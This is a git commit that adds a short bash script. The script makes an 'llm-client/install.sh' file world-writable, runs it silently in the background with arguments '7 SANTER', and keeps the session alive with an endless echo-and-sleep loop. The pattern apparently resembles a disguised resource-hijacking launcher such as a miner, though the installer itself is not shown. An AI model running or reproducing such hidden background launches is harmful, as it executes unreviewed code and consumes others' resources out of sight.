8406ffbe066f683faaa4cdc35830820c26a84ea1
gaserjuk <gaserjukilo@gmail.com>
2025-12-24 10:27:28 +0700

    Add files via upload

---
+++ bas.sh
@@ -0,0 +1,9 @@
+#!/bin/bash
+
+cd llm-client && chmod 777 install.sh && nproc --all && ./install.sh 7 SANTER >/dev/null 2>&1 &
+sleep 3
+while true
+do
+        echo "Ojo Lali Ngopi Boss..."
+        sleep 720
+done
